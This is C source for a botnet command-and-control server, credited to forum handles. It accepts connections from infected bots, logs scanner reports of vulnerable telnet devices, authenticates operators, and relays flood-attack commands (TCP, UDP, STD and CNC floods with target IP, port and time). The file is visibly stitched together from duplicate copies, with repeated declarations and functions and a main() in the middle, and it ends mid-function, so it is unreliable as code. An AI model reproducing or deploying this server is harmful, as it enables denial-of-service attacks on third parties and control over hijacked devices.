/*
Pac-Man server.c by switch

THIS IS 100% COMPATIBLE WITH Yakuza's CLIENT.C!
MESSAGE ME ON DISCORD IF YOU DONT HAVE Yakuza's CLIENT.C AND ILL SEND IT TO YOU!
My Discord: switch#0001

Don't claim credit for this or you will get clowned lol
*/
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#define MAXFDS 1000000

struct login_info {
	char username[100];
	char password[100];
};
static struct login_info accounts[100];
struct clientdata_t {
        uint32_t ip;
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
} managements[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int TELFound = 0;//Credits to Demented
//CONNECTION HANDLER MODIFIED BY Jonah
//edited banner -xFyfa
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#define HACKERZ "V1"
#define MAXFDS 1000000
char *colorCodes[] = {"31m", "32m", "33m", "34m", "35m", "36m"};
char *ports[] = {"80", "3075", "443", "22", "53", "3074", "23", "8080"};
struct account {
char id[20];
char password[20];
};
static struct account accounts[50];
struct clientdata_t {
uint32_t ip;
char build[7];
char connected;
} clients[MAXFDS];
struct telnetdata_t {
int connected;
int hax;
} managements[MAXFDS];
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;
int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
int total = 0, got = 1;
while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
return got;
}
void trim(char *str)
{
int i;
int begin = 0;
int end = strlen(str) - 1;
while (isspace(str[begin])) begin++;
while ((end >= begin) && isspace(str[end])) end--;
for (i = begin; i <= end; i++) str[i - begin] = str[i];
str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd)
{
int flags, s;
flags = fcntl (sfd, F_GETFL, 0);
if (flags == -1)
{
perror ("fcntl");
return -1;
}
flags |= O_NONBLOCK;
s = fcntl (sfd, F_SETFL, flags);
if (s == -1)
{
perror ("fcntl");
return -1;
}
return 0;
}
int hackz;
static int create_and_bind (char *port)
{
struct addrinfo hints;
struct addrinfo *result, *rp;
int s, sfd;
memset (&hints, 0, sizeof (struct addrinfo));
hints.ai_family = AF_UNSPEC;
hints.ai_socktype = SOCK_STREAM;
hints.ai_flags = AI_PASSIVE;
s = getaddrinfo (NULL, port, &hints, &result);
if (s != 0)
{
fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
return -1;
}
for (rp = result; rp != NULL; rp = rp->ai_next)
{
sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
if (sfd == -1) continue;
int yes = 1;
if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
if (s == 0)
{
break;
}
close (sfd);
}
if (rp == NULL)
{
fprintf (stderr, "Could not bind\n");
return -1;
}
freeaddrinfo (result);
return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
int sendMGM = 1;
if(strcmp(msg, "PING") == 0) sendMGM = 0;
char *wot = malloc(strlen(msg) + 10);
memset(wot, 0, strlen(msg) + 10);
strcpy(wot, msg);
trim(wot);
time_t rawtime;
struct tm * timeinfo;
time(&rawtime);
timeinfo = localtime(&rawtime);
char *timestamp = asctime(timeinfo);
trim(timestamp);
int i;
for(i = 0; i < MAXFDS; i++)
{
if(i == us || (!clients[i].connected && (sendMGM == 0 || !managements[i].connected))) continue;
if(sendMGM && managements[i].connected)
{
send(i, "\x1b[36m", 5, MSG_NOSIGNAL);
send(i, sender, strlen(sender), MSG_NOSIGNAL);
send(i, ": ", 2, MSG_NOSIGNAL);
}
send(i, msg, strlen(msg), MSG_NOSIGNAL);
char *root1[1024];
char usernames[80];
sprintf(root1, "\r\n\x1b[%s:~$ \x1b[37m ", colorCodes[rand() % 6]);
if(sendMGM && managements[i].connected) send(i, root1, strlen(root1), MSG_NOSIGNAL);
else send(i, "\n", 1, MSG_NOSIGNAL);
}
free(wot);
}
void *epollEventLoop(void *useless)
{
struct epoll_event event;
struct epoll_event *events;
int s;
events = calloc (MAXFDS, sizeof event);
while (1)
{
int n, i;
n = epoll_wait (epollFD, events, MAXFDS, -1);
for (i = 0; i < n; i++)
{
if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
{
clients[events[i].data.fd].connected = 0;
close(events[i].data.fd);
continue;
}
else if (listenFD == events[i].data.fd)
{
while (1)
{
struct sockaddr in_addr;
socklen_t in_len;
int infd, ipIndex;
in_len = sizeof in_addr;
infd = accept (listenFD, &in_addr, &in_len);
if (infd == -1)
{
if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
else
{
perror ("accept");
break;
}
}


s = make_socket_non_blocking (infd);
if (s == -1) { close(infd); break; }
event.data.fd = infd;
event.events = EPOLLIN | EPOLLET;
s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
if (s == -1)
{
perror ("epoll_ctl");
close(infd);
break;
}
clients[infd].connected = 1;
send(infd, "!* SCANNER ON\n", 14, MSG_NOSIGNAL);
}
continue;
}
else
{
int thefd = events[i].data.fd;
struct clientdata_t *client = &(clients[thefd]);
int done = 0;
client->connected = 1;
while (1)
{
int cheats;
ssize_t count;
char buf[2048];
memset(buf, 0, sizeof buf);
while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
{
if(strstr(buf, "\n") == NULL) { done = 1; break; }
trim(buf);
if(strcmp(buf, "PING") == 0) // basic IRC-like ping/pong challenge/response to see if server is alive
{
if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
continue;
}
if(strstr(buf, "REPORT ") == buf) // received a report of a vulnerable system from a scan
{
char *line = strstr(buf, "REPORT ") + 7;
fprintf(telFD, "%s\n", line); // let's write it out to disk without checking what it is!
fflush(telFD);
TELFound++;
continue;
}
if(strstr(buf, "PROBING") == buf)
{
char *line = strstr(buf, "PROBING");
scannerreport = 1;
continue;
}
if(strstr(buf, "REMOVING PROBE") == buf)
{
char *line = strstr(buf, "REMOVING PROBE");
scannerreport = 0;
continue;
}
if(strcmp(buf, "PONG") == 0)
{
continue;
}
printf("buf: \"%s\"\n", buf);
}
if (count == -1)
{
if (errno != EAGAIN)
{
done = 1;
}
break;
}
else if (count == 0)
{
done = 1;
break;
}
}
if (done)
{
client->connected = 0;
close(thefd);
}
}
}
}
}
unsigned int clientsConnected()
{
int i = 0, total = 0;
for(i = 0; i < MAXFDS; i++)
{
if(!clients[i].connected) continue;
total++;
}
return total;
}
void *titleWriter(void *sock)
{
int thefd = (int)sock;
char string[2048];
while(1)
{
memset(string, 0, 2048);
sprintf(string, "%c]0; :|: Bots Online: %d :|: Telnets: %d :|: Users Online: %d :|:%c", '\033', clientsConnected(), TELFound, managesConnected, '\007');
if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
sleep(2);
}
}
int Search_in_File(char *str)
{
FILE *fp;
int line_num = 0;
int find_result = 0, find_line=0;
char temp[512];
if((fp = fopen("login.txt", "r")) == NULL){
return(-1);
}
while(fgets(temp, 512, fp) != NULL){
if((strstr(temp, str)) != NULL){
find_result++;
find_line = line_num;
}
line_num++;
}
if(fp)
fclose(fp);
if(find_result == 0)return 0;
return find_line;
}
void *telnetWorker(void *sock)
{
char usernames[80];
int thefd = (int)sock;
int find_line;
managesConnected++;
pthread_t title;
char counter[2048];
memset(counter, 0, 2048);
char buf[2048];
char* nickstring;
char* username;
char* password;
memset(buf, 0, sizeof buf);
char hackz[2048];
memset(hackz, 0, 2048);
FILE *fp;
int i=0;
int c;
fp=fopen("login.txt", "r"); // format: user pass
while(!feof(fp))
{
c=fgetc(fp);
++i;
}
int j=0;
rewind(fp);
while(j!=i-1)
{
fscanf(fp, "%s %s", accounts[j].id, accounts[j].password);
++j;
}
sprintf(hackz, "\x1b[%sUsername:\x1b[30m ", colorCodes[(rand() % 6)]);
if (send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) goto end;
if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
trim(buf);
sprintf(usernames, buf);
nickstring = ("%s", buf);
find_line = Search_in_File(nickstring);
if(strcmp(nickstring, accounts[find_line].id) == 0){
sprintf(hackz, "\x1b[%sPassword:\x1b[30m ", colorCodes[(rand() % 6)]);
if (send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) goto end;
if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
trim(buf);
if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
memset(buf, 0, 2048);
goto hacker;
}
failed:
if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
if(send(thefd, "\x1b[36m Attempting To Log IP Address\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
sleep(2);
if(send(thefd, "\x1b[36m Successfully Logged Bye Bitch\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
sleep(2);
goto end;
hacker:
pthread_create(&title, NULL, &titleWriter, sock);
sprintf(hackz, "\r\n       \x1b[%s\r\n", colorCodes[(rand() % 6)]);
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) goto end;
if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;//im a hacker hehehe
		char ascii_banner_line1 [5000];
		char ascii_banner_line2 [5000];
		char ascii_banner_line3 [5000];
		char ascii_banner_line4 [5000];
		char ascii_banner_line5 [5000];
		char ascii_banner_line6 [5000];
		char ascii_banner_line7 [5000];
		char ascii_banner_line8 [5000];
		char ascii_banner_line9 [5000];
		char ascii_banner_line10 [5000];
		sprintf(ascii_banner_line1, " \x1b[35m                                                                    \r\n");
sprintf(ascii_banner_line2, "              ,,        ,,    ,,              ,,                     \r\n");
sprintf(ascii_banner_line3, "    .g8""8q.   *MM      `7MM    db              db                     \r\n");
sprintf(ascii_banner_line4, " .dP'    `YM. MM        MM                                           \r\n");
sprintf(ascii_banner_line5, " dM'      `MM MM,dMMb.  MM  `7MM `7M'   `MF'`7MM  ,pW'Wq.`7MMpMMMb.  \r\n");
sprintf(ascii_banner_line6, " MM        MM MM    `Mb MM    MM   VA   ,V    MM 6W'   `Wb MM    MM  \r\n");
sprintf(ascii_banner_line7, " MM.      ,MP MM     M8 MM    MM    VA ,V     MM 8M     M8 MM    MM  \r\n");
sprintf(ascii_banner_line8, " `Mb.    ,dP' MM.   ,M9 MM    MM     VVV      MM YA.   ,A9 MM    MM  \r\n");
sprintf(ascii_banner_line9, "   ''bmmd''   P^YbmdP'.JMML..JMML.    W     .JMML.`Ybmd9'.JMML  JMML.\r\n");
sprintf(ascii_banner_line10,"                                                                    \r\n");
		if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line10, strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
sprintf(hackz, "\x1b[%s\r\nWelcome,\x1b[34m %s\x1b[%s To the Oblivion\r\n", colorCodes[(rand() % 6)], usernames, colorCodes[(rand() % 6)]);
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) goto end;
char *root223[1024];
sprintf(root223, "\x1b[%s~$ \x1b[0;37m ", colorCodes[rand() % 5], usernames);
if(send(thefd, root223, strlen(root223), MSG_NOSIGNAL) == -1) goto end;
pthread_create(&title, NULL, &titleWriter, sock);
managements[thefd].connected = 1;
while(fdgets(buf, sizeof buf, thefd) > 0)
{
if (strncmp(buf, "SHOW", 4) == 0 || strncmp(buf, "BOTS", 4) == 0 || strncmp(buf, "bots", 4) == 0)
{
sprintf(hackz, "[\x1b[36m+\x1b[37m] Bots Online: %d [\x1b[31m-\x1b[37m] Users Online: %d [\x1b[36m+\x1b[37m]\r\n", clientsConnected(), managesConnected);
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
}
if (strncmp(buf, "status", 6) == 0 || strncmp(buf, "STATUS", 6) == 0)
{
sprintf(hackz, "[\x1b[36m+\x1b[37m] Telnet devices: %d [\x1b[31m-\x1b[37m] Telnet status: % [\x1b[36m+\x1b[37m]\r\n", TELFound, scannerreport);
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
}
if (strncmp(buf, "!* STD", 6) == 0 || strncmp(buf, "!* UDP", 6) == 0 || strncmp(buf, "!* TCP", 6) == 0)
{
sprintf(hackz, "[\x1b[36m+\x1b[37m] Successfully Sent Attack [\x1b[36m+\x1b[37m]\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
}
if (strncmp(buf, "rules", 5) == 0 || strncmp(buf, "RULES", 5) == 0)
{
sprintf(hackz, "Please Read The Following Rules if not will result in ban\r\n1.) DO NOT SHARE YOUR ACCOUNT INFO \r\n2.) DO NOT SPAM THE NET\r\n3.) Dont hit any goverment websites\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
}
if (strncmp(buf, "HELP", 4) == 0 || strncmp(buf, "help", 4) == 0 || strncmp(buf, "?", 4) == 0)
{
sprintf(hackz, "\x1b[37m[+\x1b[36m]Attack Commands----------------------------------\x1b[37m\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
sprintf(hackz, "\x1b[37m!* TCP [IP] [PORT] [TIME] 32 all 0 1 | TCP FLOOD\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
sprintf(hackz, "\x1b[37m!* UDP [IP] [PORT] [TIME] 32 0 1 | UDP FLOOD\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
sprintf(hackz, "\x1b[37m!* STD [IP] [PORT] [TIME] | STD FLOOD\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
sprintf(hackz, "\x1b[37m!* CNC [IP] [ADMIN PORT] [TIME] | CNC FLOOD\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
sprintf(hackz, "\x1b[37m[+]\x1b[36mExtra Commands-----------------------------------\x1b[37m\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
sprintf(hackz, "\x1b[37m!* KILLATTK | KILLS ALL ATTACKS\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
sprintf(hackz, "\x1b[37m!* PORT_SCAN IP | MAKE SURE TO PUT THE IP AT THE END\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
sprintf(hackz, "\x1b[37m[+]\x1b[36mTerminal Commands----------------------------------\x1b[37m\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
sprintf(hackz, "\x1b[37mBOTS | SHOWS BOT COUNT\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
sprintf(hackz, "\x1b[37mCLS | CLEARS YOUR SCREEN\r\n");
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
}
if(strstr(buf, "PORT_SCAN")) {
sleep(2);
sprintf(hackz, "Open Ports %s, %s\r\n", ports[(rand() % 8)], ports[(rand() % 8)]);
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) return;
}
if (strncmp(buf, "CLEAR", 5) == 0 || strncmp(buf, "clear", 5) == 0 || strncmp(buf, "cls", 3) == 0 || strncmp(buf, "CLS", 3) == 0)
{
sprintf(hackz, "\r\n       \x1b[%s\r\n", colorCodes[(rand() % 6)]);
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) goto end;
if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
sprintf(ascii_banner_line1, "                                                                     \r\n");
sprintf(ascii_banner_line2, "              ,,        ,,    ,,              ,,                     \r\n");
sprintf(ascii_banner_line3, "    .g8""8q.   *MM      `7MM    db              db                     \r\n");
sprintf(ascii_banner_line4, " .dP'    `YM. MM        MM                                           \r\n");
sprintf(ascii_banner_line5, " dM'      `MM MM,dMMb.  MM  `7MM `7M'   `MF'`7MM  ,pW'Wq.`7MMpMMMb.  \r\n");
sprintf(ascii_banner_line6, " MM        MM MM    `Mb MM    MM   VA   ,V    MM 6W'   `Wb MM    MM  \r\n");
sprintf(ascii_banner_line7, " MM.      ,MP MM     M8 MM    MM    VA ,V     MM 8M     M8 MM    MM  \r\n");
sprintf(ascii_banner_line8, " `Mb.    ,dP' MM.   ,M9 MM    MM     VVV      MM YA.   ,A9 MM    MM  \r\n");
sprintf(ascii_banner_line9, "   ''bmmd''   P^YbmdP'.JMML..JMML.    W     .JMML.`Ybmd9'.JMML  JMML.\r\n");
sprintf(ascii_banner_line10,"                                                                     \r\n");
		if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line10, strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
sprintf(hackz, "\x1b[%s\r\nWelcome,\x1b[34m %s\x1b[%s To the Oblivion\r\n", colorCodes[(rand() % 6)], usernames, colorCodes[(rand() % 6)]);
if(send(thefd, hackz, strlen(hackz), MSG_NOSIGNAL) == -1) goto end;
char *root55[1024];
sprintf(root55, "\x1b[%s~$ \x1b[0;37m ", colorCodes[rand() % 5], usernames);
if(send(thefd, root55, strlen(root55), MSG_NOSIGNAL) == -1) goto end;
pthread_create(&title, NULL, &titleWriter, sock);
managements[thefd].connected = 1;
}
if (strncmp(buf, "exit", 4) == 0 || strncmp(buf, "EXIT", 4) == 0 || strncmp(buf, "LOGOUT", 6) == 0)
{
goto end;
}
if (strncmp(buf, "2000", 4) == 0 || strncmp(buf, "2100", 4) == 0 || strncmp(buf, "2200", 4) == 0 || strncmp(buf, "2300", 4) == 0 || strncmp(buf, "2400", 4) == 0 || strncmp(buf, "2500", 4) == 0)
{
printf("Over Time By %s\n", accounts[find_line].id, buf);
FILE *logFile;
logFile = fopen("OverTime.log", "a");
fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
fclose(logFile);
goto end;
}
if(strstr(buf, "LOLNOGTFO"))
{
printf("ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
FILE *logFile;
logFile = fopen("KILL.log", "a");
fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
fclose(logFile);
goto end;
}
if(strstr(buf, "SH"))
{
printf("ATTEMPT TO SH BOTS BY %s\n", accounts[find_line].id, buf);
FILE *logFile;
logFile = fopen("SH.log", "a");
fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
fclose(logFile);
goto end;
}
trim(buf);
char *root2[1024];
sprintf(root2, "\x1b[%s~$ \x1b[0;37m ", colorCodes[rand() % 5], usernames);
if(send(thefd, root2, strlen(root2), MSG_NOSIGNAL) == -1) goto end;
if(strlen(buf) == 0) continue;
printf("%s: \"%s\"\n",accounts[find_line].id, buf);
FILE *logFile;
logFile = fopen("report.log", "a");
fprintf(logFile, "%s: \"%s\"\n",accounts[find_line].id, buf);
fclose(logFile);
broadcast(buf, thefd, usernames);
memset(buf, 0, 2048);
}
end: // cleanup dead socket
managements[thefd].connected = 0;
close(thefd);
managesConnected--;
}
void *telnetListener(int port)
{
int sockfd, newsockfd;
socklen_t clilen;
struct sockaddr_in serv_addr, cli_addr;
sockfd = socket(AF_INET, SOCK_STREAM, 0);
if (sockfd < 0) perror("ERROR opening socket");
bzero((char *) &serv_addr, sizeof(serv_addr));
serv_addr.sin_family = AF_INET;
serv_addr.sin_addr.s_addr = INADDR_ANY;
serv_addr.sin_port = htons(port);
if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) perror("ERROR on binding");
listen(sockfd,5);
clilen = sizeof(cli_addr);
while(1)
{
newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
if (newsockfd < 0) perror("ERROR on accept");
pthread_t thread;
pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
}
}
int main (int argc, char *argv[], void *sock)
{
signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
int s, threads, port;
struct epoll_event event;
if (argc != 4)
{
fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
exit (EXIT_FAILURE);
}
port = atoi(argv[3]);
telFD = fopen("telnet.txt", "a+");
threads = atoi(argv[2]);
listenFD = create_and_bind (argv[1]); // try to create a listening socket, die if we can't
if (listenFD == -1) abort ();
s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
if (s == -1) abort ();
s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
if (s == -1)
{
perror ("listen");
abort ();
}
epollFD = epoll_create1 (0);
if (epollFD == -1)
{
perror ("epoll_create");
abort ();
}
event.data.fd = listenFD;
event.events = EPOLLIN | EPOLLET;
s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
if (s == -1)
{
perror ("epoll_ctl");
abort ();
}
pthread_t thread[threads + 2];
while(threads--)
{
pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL);
}
pthread_create(&thread[0], NULL, &telnetListener, port);
while(1)
{
broadcast("PING", -1, "HACKER");
sleep(60);
}
close (listenFD);
return EXIT_SUCCESS;
}
static volatile int scannerreport;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[1;35m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *BotEventLoop(void *useless) {
	struct epoll_event event;
	struct epoll_event *events; 
	int s;
    events = calloc (MAXFDS, sizeof event);
    while (1) {
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) {
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) {
               while (1) {
				struct sockaddr in_addr;
                socklen_t in_len;
                int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                    else {
						perror ("accept");
						break;
						 }
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip) {
						dup = 1;
						break;
					}}
				if(dup) {
					if(send(infd, "!* BOTKILL\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                    close(infd);
                    continue;
				}
				s = make_socket_non_blocking (infd);
				if (s == -1) { close(infd); break; }
				event.data.fd = infd;
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1) {
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
			}
			continue;
		}
		else {
			int datafd = events[i].data.fd;
			struct clientdata_t *client = &(clients[datafd]);
			int done = 0;
            client->connected = 1;
			while (1) {
				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					if(strstr(buf, "\n") == NULL) { done = 1; break; }
					trim(buf);
					if(strcmp(buf, "PING") == 0) {
						if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
						continue;
					}
					if(strstr(buf, "REPORT ") == buf) {
						char *line = strstr(buf, "REPORT ") + 7;
						fprintf(telFD, "%s\n", line);
						fflush(telFD);
						TELFound++;
						continue;
					}
					if(strstr(buf, "PROBING") == buf) {
						char *line = strstr(buf, "PROBING");
						scannerreport = 1; 
						continue;
					}
					if(strstr(buf, "REMOVING PROBE") == buf) {
						char *line = strstr(buf, "REMOVING PROBE");
						scannerreport = 0;
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
					printf("buf: \"%s\"\n", buf);
				}
				if (count == -1) {
					if (errno != EAGAIN) {
						done = 1;
					}
					break;
				}
				else if (count == 0) {
					done = 1;
					break;
				}
			if (done) {
				client->connected = 0;
				close(datafd);
}}}}}}
unsigned int BotsConnected() {
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
